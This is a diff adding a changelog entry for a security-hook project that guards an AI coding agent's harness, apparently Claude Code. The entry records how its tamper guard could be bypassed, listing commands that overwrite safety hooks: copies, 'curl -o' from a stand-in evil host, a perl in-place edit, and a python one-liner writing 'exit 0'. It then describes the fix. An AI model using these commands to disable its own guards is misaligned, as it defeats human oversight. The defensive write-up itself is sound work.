@@ -2,6 +2,27 @@
 
 ## Contents
 
+- [2.24.14] - 2026-07-30 — fix(security): **`harness-tamper-guard` blocked no way of WRITING a new file over a hook — `curl -o <hook> https://evil` replaced a guard with attacker content and nothing in the chain objected.** The verb list covered delete and edit-in-place (`rm`, `mv`, `chmod`, `truncate`, `tee`, `>`), but every create-or-overwrite form was absent. Verified against the whole PreToolUse chain — `harness-tamper-guard`, `safety.sh` and `code-security-scanner` — all seven of these were allowed by **every** guard:
+
+  ```
+  cp / install / rsync / scp  <evil>  ~/.claude/supercharger/hooks/safety.sh
+  curl -o …/hooks/safety.sh https://evil.tld/x       wget -O …
+  perl -pi -e 's/.*//' …/hooks/safety.sh
+  python3 -c "open('…/hooks/safety.sh','w').write('exit 0')"
+  ```
+
+  Found from the opposite symptom. The guard kept **denying a legitimate `cp`** into `hooks/` because an unrelated `rm` appeared elsewhere in the same command, while **allowing a malicious `cp`** on its own. Those are one flaw, not two: the guard paired *any* verb with *any* target anywhere in the command — never checking what was being written where — so it was simultaneously too loose and too tight. Both halves are fixed together.
+
+  **Verb list** gains the write forms above. Interpreter one-liners count only when the segment also carries a write indicator (`open(…, 'w')`, `.write(`, `writeFileSync`, `truncate`), so `python3 -c "print(open(hook).read())"` stays allowed.
+
+  **Pairing is now segment-scoped** — split on `;`, `&&`, `||`, `|` and newline; a destructive verb must actually be aimed at a protected path in the same segment. This retires the false-positive class that has recurred since 2.24.9 (an unrelated `rm` no longer poisons a whole compound command). The one thing segment-scoping would otherwise lose, the two-step `cd …/hooks` then `rm -rf .` where no single segment names the target, is handled explicitly: a `cd` INTO a protected directory arms the next destructive verb.
+
+  **Copy-family is destination-sensitive.** For `cp`/`install`/`rsync`/`scp` only the final token counts, so copying a hook OUT for inspection is a read and passes, while copying one IN is blocked. `mv` deliberately stays position-insensitive — moving a hook out removes it from `hooks/`.
+
+  Two bugs of mine caught by the tests before release, both worth recording because they fail SILENTLY: `awk -v` runs escape processing on the value, which rewrote `open\(` to `open(` — an unbalanced group — so awk died on the invalid regex, printed nothing, and the guard allowed **everything including `rm <hook>`**; patterns now go through `ENVIRON`, which is verbatim. And the code-dir arms required a trailing slash, so the bare `…/supercharger/hooks` in the `cd` step never matched.
+
+  +24 tests pairing each attack with the legitimate operation it must not catch. Note for anyone deploying by hand: `cp`-ing a file into `hooks/` is now correctly denied — use `install.sh` / `update.sh`, which the guard does not see through. Full suite **2671/0**.
+
 - [2.24.13] - 2026-07-30 — fix(security): **the fuzzer's 300 false negatives had never been triaged, and 225 of them were two real unguarded attacks.** The figure had been reported at the end of every `fuzz-safety.sh` run for releases, treated as known background noise. It was not noise: **macOS Keychain credential reads and synthetic keystroke injection were both allowed**, and both were already listed as *dangerous* in the fuzzer's own corpus with **no pattern implementing them** — coverage asserted but never built, and the uninterpretable total hid it.
 
   Triaging 300 entries down to distinct shapes gave **4**, each then re-tested in pristine (unmutated) form:
